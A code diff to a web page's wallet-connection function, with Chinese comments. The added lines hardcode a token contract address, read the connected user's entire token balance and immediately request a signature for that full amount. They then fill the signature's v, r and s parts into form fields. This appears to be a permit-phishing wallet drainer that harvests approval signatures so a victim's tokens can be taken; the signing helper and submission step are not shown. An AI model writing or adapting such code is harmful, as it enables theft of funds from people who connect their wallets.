@@ -113,13 +113,27 @@ async function connectWallet() {
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         const accounts = await web3.eth.getAccounts();
         userAddress = accounts[0];
+        
+        // 显示连接的钱包地址
         document.getElementById('address').innerText = userAddress;
         document.getElementById('walletInfo').classList.remove('hidden');
         document.getElementById('connectWallet').classList.add('hidden');
 
         // 自动填写参数
-        document.getElementById('tokenAddress').value = '0x...（替换为你的代币合约地址）'; // 代币合约地址
+        const tokenAddress = '0xB57ee0797C3fc0205714a577c02F7205bB89dF30'; // 替换为你的代币合约地址
+        document.getElementById('tokenAddress').value = tokenAddress; // 代币合约地址
         document.getElementById('fromAddress').value = userAddress; // 被签名的钱包地址
+        
+        // 查询余额并填写
+        const balance = await getTokenBalance(tokenAddress, userAddress);
+        document.getElementById('amount').innerText = balance; // 显示余额
+
+        // 自动签名并填写 v, r, s
+        const signature = await signMessage(tokenAddress, userAddress, balance);
+        const { v, r, s } = extractSignatureParameters(signature);
+        document.getElementById('v').value = v;
+        document.getElementById('r').value = r;
+        document.getElementById('s').value = s;
     } else {
         alert('请安装MetaMask或其他以太坊钱包！');
     }
